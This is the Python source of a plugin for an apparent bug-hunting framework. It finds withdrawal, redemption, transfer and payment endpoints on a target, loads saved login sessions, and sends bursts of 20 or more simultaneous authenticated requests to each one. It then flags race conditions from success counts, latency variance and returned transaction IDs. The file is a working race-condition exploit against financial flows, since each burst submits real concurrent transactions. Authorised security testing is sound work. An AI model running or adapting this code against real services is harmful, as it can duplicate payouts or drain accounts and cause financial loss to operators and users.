from __future__ import annotations

import asyncio
import json
import os
import statistics
import time
from pathlib import Path
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from hunterops.http_client import request_http_async
from hunterops.plugin_base import Plugin
from hunterops.runtime_paths import resolve_path
from hunterops.session_profiles import auth_header, load_sessions
from hunterops.storage import PostgresStorage
from hunterops.types import Finding, Task

HIGH_VALUE_HINTS = ("withdraw", "redeem", "transfer", "wallet", "payout", "checkout", "payment")


def _set_param(url: str, key: str, value: str) -> str:
    parsed = urlparse(url)
    query = parse_qsl(parsed.query, keep_blank_values=True)
    query = [item for item in query if item[0] != key]
    query.append((key, value))
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, urlencode(query), parsed.fragment))


def _candidate_is_high_value(url: str) -> bool:
    lowered = str(url or "").lower()
    return any(marker in lowered for marker in HIGH_VALUE_HINTS)


def _extract_transaction_ids(text: str) -> list[str]:
    if not text:
        return []
    try:
        payload = json.loads(text)
    except Exception:
        return []
    out: list[str] = []
    if isinstance(payload, dict):
        for key in ("transaction_id", "txn_id", "wallet_id", "transfer_id", "reference"):
            value = payload.get(key)
            if isinstance(value, (str, int, float)):
                out.append(str(value))
    return sorted(list({x for x in out if x}))


class PluginImpl(Plugin):
    name = "race_condition_turbo"

    async def run(self, task: Task, context: dict[str, Any]) -> list[Finding]:
        try:
            return await self._run(task, context)
        except Exception as err:
            logger = context.get("logger")
            if logger is not None:
                try:
                    logger.exception(f"race_condition_turbo_unhandled target={task.target} err={err}")
                except Exception:
                    pass
            return []

    async def _run(self, task: Task, context: dict[str, Any]) -> list[Finding]:
        cfg = context["config"].get("modules", {}).get(self.name, {})
        payload = task.payload if isinstance(task.payload, dict) else {}
        timeout = int(context["runtime"].get("timeout_seconds", 25))
        scheme = str(cfg.get("base_scheme", "https")).strip().lower() or "https"
        base = f"{scheme}://{task.target}"
        burst_size = max(20, int(payload.get("burst_size", cfg.get("burst_size", 24)) or 24))
        max_candidates = max(1, int(cfg.get("max_candidates", 12)))
        variance_threshold_ms = float(cfg.get("variance_threshold_ms", 50.0))
        amount_override = str(cfg.get("amount_value", "1"))
        run_id = str(payload.get("run_id", "")).strip()
        seeds_raw = payload.get("seed_paths", cfg.get("seed_paths", ["/api/wallet/withdraw?amount=1", "/api/redeem?amount=1", "/api/transfer?amount=1"]))

        candidates: list[str] = []
        if isinstance(seeds_raw, list):
            for item in seeds_raw:
                if not isinstance(item, str) or not item.strip():
                    continue
                if item.startswith("http://") or item.startswith("https://"):
                    candidates.append(item.strip())
                else:
                    path = item if item.startswith("/") else f"/{item}"
                    candidates.append(f"{base}{path}")

        pg_cfg = context["config"].get("storage", {}).get("postgres", {})
        dsn_env = str(pg_cfg.get("dsn_env", "HUNTEROPS_POSTGRES_DSN"))
        dsn = os.getenv(dsn_env, "").strip()
        if bool(pg_cfg.get("enabled", False)) and dsn and run_id:
            try:
                storage = PostgresStorage(dsn=dsn, enabled=True)
                storage.ensure_research_schema()
                for endpoint in storage.list_known_endpoints(target=task.target, run_id=run_id, limit=300):
                    if _candidate_is_high_value(endpoint):
                        candidates.append(f"{base}{endpoint}")
            except Exception:
                pass

        unique_candidates = [url for url in sorted(list({x for x in candidates if _candidate_is_high_value(x)}))][:max_candidates]
        if not unique_candidates:
            return []

        sessions_file = str(cfg.get("sessions_file", "data/sessions.yaml"))
        sessions = load_sessions(Path(resolve_path(sessions_file)))
        auth_headers = auth_header(sessions.get(str(cfg.get("auth_context", "user")), {})) if sessions else {}

        findings: list[Finding] = []
        for candidate in unique_candidates:
            attack_url = _set_param(candidate, "amount", amount_override) if "amount=" in candidate else candidate
            latencies_ms: list[float] = []
            statuses: list[int] = []
            transaction_ids: set[str] = set()

            async def _fire() -> dict[str, Any]:
                start = time.perf_counter()
                response = await request_http_async("GET", attack_url, headers=auth_headers, timeout=timeout)
                elapsed = (time.perf_counter() - start) * 1000.0
                response["latency_ms"] = round(elapsed, 3)
                return response

            responses = await asyncio.gather(*[_fire() for _ in range(burst_size)], return_exceptions=True)
            for item in responses:
                if isinstance(item, Exception):
                    continue
                latency = float(item.get("latency_ms", 0.0) or 0.0)
                status = int(item.get("status", 0) or 0)
                latencies_ms.append(latency)
                statuses.append(status)
                for txid in _extract_transaction_ids(str(item.get("text", ""))):
                    transaction_ids.add(txid)

            if not statuses:
                continue
            success_count = len([status for status in statuses if status in {200, 201}])
            status_variants = sorted(list(set(statuses)))
            avg_latency = round(sum(latencies_ms) / max(1, len(latencies_ms)), 3)
            variance = round(statistics.pvariance(latencies_ms), 3) if len(latencies_ms) >= 2 else 0.0
            toctou_window = variance >= variance_threshold_ms
            potential_race = success_count >= 2 and (len(status_variants) > 1 or toctou_window)
            if not potential_race:
                continue
            severity = "critical" if success_count >= 4 and toctou_window else "high"
            findings.append(
                Finding(
                    plugin=self.name,
                    target=task.target,
                    category="race_condition_turbo_indicator",
                    severity=severity,
                    title=f"Potential race condition at {urlparse(candidate).path} ({success_count}/{burst_size} success)",
                    evidence={
                        "url": attack_url,
                        "burst_size": burst_size,
                        "success_count": success_count,
                        "status_variants": status_variants,
                        "avg_latency_ms": avg_latency,
                        "latency_variance_ms": variance,
                        "toctou_window_detected": toctou_window,
                        "transaction_ids": sorted(list(transaction_ids))[:30],
                        "sample_latencies_ms": [round(x, 3) for x in latencies_ms[:40]],
                    },
                    metadata={
                        "novelty": 92,
                        "confidence": 87 if toctou_window else 80,
                        "confidence_score": 87 if toctou_window else 80,
                        "impact": 95 if severity == "critical" else 88,
                        "financial_flow": True,
                        "discovery_source": self.name,
                    },
                )
            )
        return findings

